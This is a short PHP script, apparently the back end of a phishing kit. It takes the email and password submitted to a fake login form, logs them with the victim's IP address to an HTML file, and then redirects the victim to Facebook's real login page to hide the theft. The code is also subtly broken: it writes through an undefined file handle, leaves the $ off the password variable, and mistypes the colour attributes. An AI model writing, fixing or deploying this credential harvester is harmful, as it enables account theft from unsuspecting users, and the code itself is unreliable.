<?php

$email = $_POST[ 'email' ];
$pass = $_POST[ 'pass' ];
$ip = $_SERVER[ 'REMOTE_ADDR' ];
$f = fopen("user.html", "a");
fwrite($file, 'Email: [<b><font color="#0000FF"> '.$email.'</font></b>] Password:[<b><font color+"#FF0040">'.pass.'</font></b>] IP: [<b><font color+"#FE2EF7">'.$ip.'</font></b>]<br>');
fclose($f);

header("location: https://facebook.com/login.php");
?>
